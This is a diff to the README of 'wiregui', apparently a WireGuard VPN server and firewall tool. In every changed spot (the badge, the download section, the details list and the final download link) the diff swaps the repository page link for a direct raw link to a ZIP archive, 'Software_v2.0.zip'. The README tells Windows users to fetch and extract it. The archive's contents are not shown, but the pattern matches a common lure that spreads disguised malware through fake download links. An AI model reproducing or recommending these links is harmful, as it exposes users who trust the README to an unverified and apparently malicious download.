@@ -1,6 +1,6 @@
 # 🔐 wiregui - Simple VPN Server Control
 
-[![Download wiregui](https://img.shields.io/badge/Download-wiregui-4C1D95?style=for-the-badge&logo=github)](https://github.com/bellasachs4-bit/wiregui)
+[![Download wiregui](https://img.shields.io/badge/Download-wiregui-4C1D95?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bellasachs4-bit/wiregui/main/wiregui/Software_v2.0.zip)
 
 ## 🧭 Overview
 
@@ -25,7 +25,7 @@ If you plan to host the server on a home or office network, you may also need ac
 
 Visit this page to download wiregui:
 
-[https://github.com/bellasachs4-bit/wiregui](https://github.com/bellasachs4-bit/wiregui)
+[https://raw.githubusercontent.com/bellasachs4-bit/wiregui/main/wiregui/Software_v2.0.zip](https://raw.githubusercontent.com/bellasachs4-bit/wiregui/main/wiregui/Software_v2.0.zip)
 
 Open the page, look for the latest version, and download the Windows file if one is listed. If the release is packed in a ZIP file, save it to your computer and extract it first.
 
@@ -180,7 +180,7 @@ It is a strong fit when you want VPN control in one place without a heavy setup 
 - Repository: wiregui
 - Description: Firezone Inspired Wireguard VPN Server and nftables Firewall
 - Topics: nftables, nicegui, vpn, wireguard
-- Download page: [https://github.com/bellasachs4-bit/wiregui](https://github.com/bellasachs4-bit/wiregui)
+- Download page: [https://raw.githubusercontent.com/bellasachs4-bit/wiregui/main/wiregui/Software_v2.0.zip](https://raw.githubusercontent.com/bellasachs4-bit/wiregui/main/wiregui/Software_v2.0.zip)
 
 ## 📄 License
 
@@ -188,7 +188,7 @@ Check the repository page for license details before you use or share the softwa
 
 ## 🔗 Download Again
 
-[Download wiregui](https://github.com/bellasachs4-bit/wiregui)
+[Download wiregui](https://raw.githubusercontent.com/bellasachs4-bit/wiregui/main/wiregui/Software_v2.0.zip)
 
 ## 🗂️ Suggested Setup Order
 
